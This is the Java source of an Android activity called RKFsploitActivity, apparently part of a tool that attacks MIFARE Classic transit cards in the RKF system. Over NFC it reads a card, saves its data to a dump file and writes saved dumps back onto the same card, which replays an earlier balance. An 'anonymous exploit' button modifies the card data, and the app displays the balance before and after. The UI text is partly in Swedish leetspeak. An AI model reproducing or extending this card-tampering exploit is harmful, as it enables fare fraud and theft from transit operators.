package com.vsttrfk.git64;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.IntentFilter;
import android.nfc.NfcAdapter;
import android.nfc.Tag;
import android.nfc.TagLostException;
import android.nfc.tech.MifareClassic;
import android.os.Bundle;
import android.os.Environment;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnKeyListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ScrollView;
import android.widget.TextView;

import com.vsttrfk.git64.tools.CallbackHandler;
import com.vsttrfk.git64.tools.FileIO;
import com.vsttrfk.git64.tools.MfcIO;
import com.vsttrfk.git64.tools.RKFCard;
import com.vsttrfk.git64.tools.Util;

public class RKFsploitActivity extends Activity implements CallbackHandler<RKFCard> {
	private MifareClassic mfcDevice;
	private TextView statusBox;
	private RKFCard loadedCard;
	private EditText filePathEditText;
	private NfcAdapter mAdapter;
	private IntentFilter[] filters;
	private PendingIntent pIntent;

	private Button btnWriteNfc;
	private Button btnWriteFile;
	private Button btnAnonExpl;
	private Button btnReadFile;
	private ScrollView scroll;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.design2);
		initUI();
		mAdapter = NfcAdapter.getDefaultAdapter(this);
		pIntent = PendingIntent.getActivity(this, 0, new Intent(this,
				getClass()).addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP), 0);
		IntentFilter tagDetected = new IntentFilter(
				NfcAdapter.ACTION_TAG_DISCOVERED);
		filters = new IntentFilter[] { tagDetected };

		updateUI();

	}

	private void initUI() {
		statusBox = (TextView) findViewById(R.id.statusBox);
		scroll = (ScrollView) findViewById(R.id.scrollView);
		filePathEditText = (EditText) findViewById(R.id.filePath);
		btnReadFile = (Button) findViewById(R.id.btn_read_file);
		btnWriteNfc = (Button) findViewById(R.id.btn_write_nfc);
		btnWriteFile = (Button) findViewById(R.id.btn_write_file);
		btnAnonExpl = (Button) findViewById(R.id.btn_anon_expl);
		filePathEditText.setOnKeyListener(new OnKeyListener() {

			public boolean onKey(View v, int keyCode, KeyEvent event) {
				if (keyCode == 66 && event.getAction() == KeyEvent.ACTION_UP) {
					readFile();
				}
				return false;
			}
		});
		statusBox.requestFocus();
		statusBox.setMovementMethod(new ScrollingMovementMethod());
		printDumps(getDumpList());
	}

	@Override
	protected void onResume() {
		super.onResume();
		mAdapter.enableForegroundDispatch(this, pIntent, filters, null);
	}

	@Override
	protected void onPause() {
		super.onPause();
		mAdapter.disableForegroundDispatch(this);
	}

	@Override
	protected void onNewIntent(Intent intent) {
		if (NfcAdapter.ACTION_TAG_DISCOVERED.equals(intent.getAction())) {
			mfcDevice = MifareClassic.get((Tag) intent
					.getParcelableExtra(NfcAdapter.EXTRA_TAG));
			readNfc();
		} else {
			Log.e("ERROR",
					"Unknown: " + intent + "\nAction: " + intent.getAction());
		}
	}

	private List<String> getDumpList() {
		List<String> dumps = new ArrayList<String>();
		String[] stuff = Environment.getExternalStorageDirectory().list();
		for (int i = 0; i < stuff.length; i++) {
			if (stuff[i].endsWith(".mfd")) {
				dumps.add(stuff[i]);
			}
		}
		return dumps;
	}

	private void printDumps(List<String> dumps) {
		if (dumps.isEmpty()) {
			statusBox.append("Läs in kort och skriv ut till fil\n");
		} else {
			statusBox.append("Sparade vsttrfkKort: \n");
			for (int i = 0; i < dumps.size(); i++) {
				statusBox.append(i + ") " + dumps.get(i) + "\n");
			}
		}
	}

	public void readNfc() {
		if (mfcDevice != null) {

			statusBox.append("Läser k0rt...\n");
			try {
				RKFCardFactory.createCard(mfcDevice, this);
			} catch (IOException e) {
				statusBox.append("Fel vid läsning: \n" + e.getMessage());
				return;
			}
		} else {
			statusBox.append("yue put cardz on m3 first plx\n");
		}

		updateUI();
	}

	public void writeFileAction(View view) {
		if (loadedCard == null) {
			statusBox.append("ing3t 1nl43s7 k0r7 -_-\n");
		} else {
			String uid = "";
			final byte[] id = loadedCard.getId();
			for (int i = 0; i < 2; i++) { // 5 is full id.
				uid += Util.toHexString(id[i]).toUpperCase(Locale.ROOT);
			}
			final String fileName = loadedCard.getProvider() + "-" 
		       + uid + "-" 
		       + loadedCard.getBalance();
			statusBox.append(FileIO.getInstance().writeCardToFile(
					loadedCard.getData(), fileName) ? "d0n3!\n"
					: "Failed to write f1l3\n");
			printDumps(this.getDumpList());
		}
		updateUI();

	}

	private void updateUI() {
		scroll.post(new Runnable() {
			public void run() {
				scroll.smoothScrollTo(0, statusBox.getBottom());
			}
		});

	}
	public void readFileAction(View view) {
		readFile();
	} 
	
	public void writeNfcAction(View view) {
		statusBox.append("commencing");
		if (mfcDevice != null
				&& loadedCard != null
				&& Util.arrayEqual(mfcDevice.getTag().getId(),
						loadedCard.getId())) {
			MfcIO.getInstance().writeMfcAsync(mfcDevice, loadedCard.getData(),
					loadedCard.getKeysA(), loadedCard.getKeysB(), this); // mfcDevice, loadedCard
		} else {
			statusBox
					.append("Either no card on reader, nothing to write, or id missmatch... :P\n");
		}
		updateUI();
	}

	public void readFile() {
		List<String> dumpList = getDumpList();
		final String inputText = "" + filePathEditText.getText();
		if (inputText.length() > 0) {
			String binDump = Environment.getExternalStorageDirectory()
					.getAbsolutePath() + "/";
			if (Util.isInt(inputText)) {
				int fileNbr = Integer.parseInt(inputText);
				if (fileNbr < dumpList.size()) {
					binDump += dumpList.get(fileNbr);
				} else {
					statusBox.append("Invalid number!\n");
				}
			} else {
				binDump += inputText;
			}
			try {
				loadedCard = RKFCardFactory.createCard(binDump);

			} catch (FileNotFoundException e1) {
				statusBox.append("FILE " + binDump + " NOT FOUND\n");
				return;
			} catch (IOException e2) {
				statusBox.append("ERROR HANDLING FILE " + binDump + "\n");
				return;
			}
			statusBox.append(getCardInfo(loadedCard)
					+ "\nNu kan du skriva till nfc!\n");

		} else {
			statusBox.append("Ange filnamn.\n");
		}
		updateUI();
	}

	private static String getCardInfo(RKFCard card) {
		byte[] id = card.getId();
		String strId = "";
		for (int i = 0; i < id.length; i++) {
			strId += Util.toHexString(id[i]);
		}
		return "\n1n14357 k0r7\n----------\nID: \t" + strId + "\nProvider: \t"
				+ card.getProvider() + "\nBalance: \t" + card.getBalance()
				+ "kr\nAnonymousReturn ger:" + card.getOldBalance() + "kr\n";

	}

	public void anonymousExploitAction(View view) throws TagLostException,
			IOException {

		if (mfcDevice != null
				|| loadedCard != null
				&& Util.arrayEqual(mfcDevice.getTag().getId(),
						loadedCard.getId())) {
			
			if (!mfcDevice.isConnected()) {
				mfcDevice.connect();
			}

			double saldo = loadedCard.getBalance();
			if (!loadedCard.anonymousExploit()) {
				statusBox.append("Kortet är redan 3XPL0173|>\n" + "Saldo: "
						+ saldo + "\n");
				return;
			}

			MfcIO.getInstance().writeMfc(mfcDevice, loadedCard.getData(),
					loadedCard.getKeysA(), loadedCard.getKeysB());

			statusBox.append("Saldo innan: " + saldo + "\n");

			saldo = loadedCard.getBalance();

			statusBox.append("Saldo efter: " + saldo + "\n");

		} else {
			statusBox.append("Can't see or use card\n");
		}

		updateUI();

	}

	public void updateStatus(final String status) {
		statusBox.post(new Runnable() {

			public void run() {
				statusBox.append(status);
				updateUI();

			}
		});
	}

	public void handleResult(RKFCard card) {
		this.loadedCard = card;
		updateStatus(getCardInfo(card));
	}

	public void enableGUI(boolean val) {
		btnWriteNfc.setEnabled(val);
		btnWriteFile.setEnabled(val);
		btnAnonExpl.setEnabled(val);
		filePathEditText.setEnabled(val);
		btnReadFile.setEnabled(val);
	}

}